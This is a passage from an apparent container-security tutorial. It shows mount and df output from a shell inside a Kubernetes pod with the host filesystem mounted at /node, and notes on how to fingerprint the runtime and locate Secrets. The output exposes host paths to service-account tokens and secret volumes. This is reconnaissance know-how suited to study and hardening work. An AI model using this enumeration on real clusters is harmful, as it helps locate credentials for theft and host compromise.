overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/6f56cc6284d074f648dbc6b8209f0bb8b2656682e66f344b95427ecad3224e78/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/18/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/17/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/16/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/14/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/e20dd7dd5c36e875d342adf671e77025751edaeaeafb508f1b5ca8f7e564d1b1/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/a8ad72ec5e3fc1f8499d2ccc063646558c123a88645cb733db42378d464b8bf7/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/21/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/21/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/93a4c578bf7f4fd546fb6eb7f248d68f5fcc62e79e4e97c292fb2923ff30ec5f/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/22/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/678d582f0fd4ed1f4746af6406af7e8bf3676e5be62557fc5ff4b5288cc4b930/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/22/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2c07d9808913c657f29b95dfb2fed373d6444435266fc6e90db47d7e81e3e5de/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/64e46ad0300cf7f353ba040e8070eadda0f6cbc607c7546f3ac4e6b2d27c94b9/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/61a2b4a4de39b7f4c5b591bbd6e1cc76d599fc00f146df50738254ba8703c289/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/82e4e5f03f9f81113ea9d0f71192a1832b5d1f728e3c60df9b81456212255f49/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/33/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/8c76f3bfebd7bb1fa2edfd8f4a52afc635c4e54073a41ba4a8e3987e4b40e041/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/37/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/39/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/39/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/413d7695afd5060deabbe2fc1ab53081fa74e632732be027dcec507b0c1ef92c/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/41/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/41/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/37f4f2004bdcb265098b4a1e88b18c11bd43c0df271def4a3a12f07a2fa19125/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/48/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/47/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/46/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/44/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/43/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/42/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/40/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/0e7fad6ade111d2f14e1993ef2b9abb47e70e13c0f4eba52b8e6e03a21fcac88/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/48/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/47/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/46/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/44/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/43/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/42/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/40/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/50/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/50/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/cab55a15e33160bab6a5ea8316c82fb5df89db3e87bc65c89dbcb6adbd8315f5/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/63/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/62/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/61/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/60/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/59/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/58/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/56/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/55/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/40/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/64/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/64/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/a705461fe1fcc0ac0afedd7c9e752216742c71a043d81a2188846da8573656ca/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/74/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/73/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/72/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/70/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/69/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/68/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/67/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/66/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/65/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/52/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/51/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/75fbdcbdc0df2fdd6fb03f15f344206dc8113619eb4fbbd545e3aecb134e845d/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/53/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/52/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/51/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/a0b9df519794a12ca2f9e2765e6a983dcc62c2307a2351d693ee4af914f9d264/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/77/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/77/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/c258e8b18ac85d55400236f5d8488d82efbb2b35d0a94e7252d1e64f1c1b67e8/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/92/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/91/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/90/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/88/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/87/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/86/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/85/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/84/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/83/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/82/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/81/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/80/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/93/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/93/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/642899cb6313d2857bbc434ed6785401d9b7761be6f5c25b7a4f045b3c5f1cc9/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/128/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/128/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/156/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/155/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/154/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/153/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/152/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/151/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/150/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/149/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/148/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/147/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/146/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/145/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/144/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/143/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/142/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/141/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/139/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/138/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/137/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/136/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/134/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/133/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/131/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/130/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/129/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/95/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/157/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/157/work)
overlay on /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686/rootfs type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/156/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/155/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/154/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/153/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/152/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/151/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/150/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/149/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/148/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/147/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/146/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/145/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/144/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/143/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/142/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/141/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/139/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/138/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/137/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/136/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/134/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/133/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/131/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/130/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/129/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/95/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/157/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/157/work)
bash-5.1# 

Note: There are multiple layered directories listed,
and these are combined into a single
filesystem at runtime by overlayfs. 

Note: These paths are fingerprints of the container
runtime’s default configuration, and runc
leaks its identity in the same way , with adifferent filesystem layout

Run the df command to see if there are any
Secrets mounted into the container. In this
example no external entities are mounted into
the container:

bash-5.1# df
Filesystem           1K-blocks      Used Available Use% Mounted on
overlay               19475088   7932692  10530072  43% /
tmpfs                    65536         0     65536   0% /dev
tmpfs                  1012780         0   1012780   0% /sys/fs/cgroup
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /node
udev                    957404         0    957404   0% /node/dev
tmpfs                  1012780         0   1012780   0% /node/dev/shm
tmpfs                   202556     37720    164836  19% /node/run
tmpfs                     5120         0      5120   0% /node/run/lock
tmpfs                   202556     37720    164836  19% /node/run/snapd/ns
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/93c0b6c1bd9eedaa041d4f9aab98657137a5332ef9807f36dcb6d7511557090d/shm
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/4b8209b689edf37111f69a31b4a525add26c8ffbf0b711ede80a566670f0fed5/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/93c0b6c1bd9eedaa041d4f9aab98657137a5332ef9807f36dcb6d7511557090d/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/4b8209b689edf37111f69a31b4a525add26c8ffbf0b711ede80a566670f0fed5/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/b30c0352ea7035ae3f1c57973a5ad406bb9d5181f54b34c1d9bb2659fcbef494/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/6f56cc6284d074f648dbc6b8209f0bb8b2656682e66f344b95427ecad3224e78/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/e20dd7dd5c36e875d342adf671e77025751edaeaeafb508f1b5ca8f7e564d1b1/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/e20dd7dd5c36e875d342adf671e77025751edaeaeafb508f1b5ca8f7e564d1b1/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/a8ad72ec5e3fc1f8499d2ccc063646558c123a88645cb733db42378d464b8bf7/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/a8ad72ec5e3fc1f8499d2ccc063646558c123a88645cb733db42378d464b8bf7/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/93a4c578bf7f4fd546fb6eb7f248d68f5fcc62e79e4e97c292fb2923ff30ec5f/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/678d582f0fd4ed1f4746af6406af7e8bf3676e5be62557fc5ff4b5288cc4b930/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/2c07d9808913c657f29b95dfb2fed373d6444435266fc6e90db47d7e81e3e5de/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2c07d9808913c657f29b95dfb2fed373d6444435266fc6e90db47d7e81e3e5de/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/64e46ad0300cf7f353ba040e8070eadda0f6cbc607c7546f3ac4e6b2d27c94b9/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/64e46ad0300cf7f353ba040e8070eadda0f6cbc607c7546f3ac4e6b2d27c94b9/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/61a2b4a4de39b7f4c5b591bbd6e1cc76d599fc00f146df50738254ba8703c289/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/61a2b4a4de39b7f4c5b591bbd6e1cc76d599fc00f146df50738254ba8703c289/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/82e4e5f03f9f81113ea9d0f71192a1832b5d1f728e3c60df9b81456212255f49/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/8c76f3bfebd7bb1fa2edfd8f4a52afc635c4e54073a41ba4a8e3987e4b40e041/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/413d7695afd5060deabbe2fc1ab53081fa74e632732be027dcec507b0c1ef92c/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/413d7695afd5060deabbe2fc1ab53081fa74e632732be027dcec507b0c1ef92c/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/37f4f2004bdcb265098b4a1e88b18c11bd43c0df271def4a3a12f07a2fa19125/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/0e7fad6ade111d2f14e1993ef2b9abb47e70e13c0f4eba52b8e6e03a21fcac88/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/cab55a15e33160bab6a5ea8316c82fb5df89db3e87bc65c89dbcb6adbd8315f5/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/a705461fe1fcc0ac0afedd7c9e752216742c71a043d81a2188846da8573656ca/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/75fbdcbdc0df2fdd6fb03f15f344206dc8113619eb4fbbd545e3aecb134e845d/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/a0b9df519794a12ca2f9e2765e6a983dcc62c2307a2351d693ee4af914f9d264/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/a0b9df519794a12ca2f9e2765e6a983dcc62c2307a2351d693ee4af914f9d264/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/c258e8b18ac85d55400236f5d8488d82efbb2b35d0a94e7252d1e64f1c1b67e8/rootfs
shm                      65536         0     65536   0% /node/run/containerd/io.containerd.grpc.v1.cri/sandboxes/642899cb6313d2857bbc434ed6785401d9b7761be6f5c25b7a4f045b3c5f1cc9/shm
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/642899cb6313d2857bbc434ed6785401d9b7761be6f5c25b7a4f045b3c5f1cc9/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686/rootfs
overlay               19475088   7932692  10530072  43% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686/rootfs
tmpfs                    65536         0     65536   0% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686/rootfs/dev
tmpfs                  1012780         0   1012780   0% /node/run/containerd/io.containerd.runtime.v2.task/k8s.io/2fdc166ad0044623ced7b0aacf1d3f5721a69518644cd36fa2e1344febdf6686/rootfs/sys/fs/cgroup
tmpfs                     4096         0      4096   0% /node/sys/fs/cgroup
df: /node/proc/sys/fs/binfmt_misc: Symbolic link loop
/dev/loop0               56960     56960         0 100% /node/snap/core18/2409
/dev/loop1               56832     56832         0 100% /node/snap/core18/1997
/dev/sda2               999320    132580    797928  14% /node/boot
/dev/loop3              103808    103808         0 100% /node/snap/lxd/23155
/dev/loop2               70528     70528         0 100% /node/snap/lxd/20037
/dev/loop4               48128     48128         0 100% /node/snap/snapd/16010
/dev/loop5               63488     63488         0 100% /node/snap/core20/1518
tmpfs                  1923160         0   1923160   0% /node/var/lib/kubelet/pods/70186b32-a142-41a8-bfd0-7847c8e05b3a/volumes/kubernetes.io~secret/clustermesh-secrets
tmpfs                  1923160         0   1923160   0% /node/var/lib/kubelet/pods/70186b32-a142-41a8-bfd0-7847c8e05b3a/volumes/kubernetes.io~projected/hubble-tls
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/e2ca4509-4eef-4f9b-9155-d4539a85de76/volumes/kubernetes.io~projected/kube-api-access-nm9bt
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/70186b32-a142-41a8-bfd0-7847c8e05b3a/volumes/kubernetes.io~projected/kube-api-access-62vpg
tmpfs                   174080        12    174068   0% /node/var/lib/kubelet/pods/db81dd37-aa52-4338-87de-0d5d621e6053/volumes/kubernetes.io~projected/kube-api-access-bk92r
tmpfs                   174080        12    174068   0% /node/var/lib/kubelet/pods/2642a532-35ae-488d-8a6c-26aa79c950e2/volumes/kubernetes.io~projected/kube-api-access-bp2w7
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/349566a1-7769-4d91-baea-174dd3831982/volumes/kubernetes.io~projected/kube-api-access-wzwkf
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/86fc82ee-88c1-4201-94fe-c3d843c2dd99/volumes/kubernetes.io~projected/kube-api-access-mhwnr
tmpfs                  1923160         4   1923156   0% /node/var/lib/kubelet/pods/06740fce-b2eb-4288-be50-741f8f70ab5e/volumes/kubernetes.io~secret/config
tmpfs                  1923160         0   1923160   0% /node/var/lib/kubelet/pods/06740fce-b2eb-4288-be50-741f8f70ab5e/volumes/kubernetes.io~secret/web-config
tmpfs                  1923160         4   1923156   0% /node/var/lib/kubelet/pods/06740fce-b2eb-4288-be50-741f8f70ab5e/volumes/kubernetes.io~projected/tls-assets
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/06740fce-b2eb-4288-be50-741f8f70ab5e/volumes/kubernetes.io~projected/kube-api-access-l62hd
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /node/var/lib/kubelet/pods/86fc82ee-88c1-4201-94fe-c3d843c2dd99/volume-subpaths/config/grafana/0
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /node/var/lib/kubelet/pods/86fc82ee-88c1-4201-94fe-c3d843c2dd99/volume-subpaths/sc-dashboard-provider/grafana/3
tmpfs                  1923160         0   1923160   0% /node/var/lib/kubelet/pods/06740fce-b2eb-4288-be50-741f8f70ab5e/volume-subpaths/web-config/prometheus/4
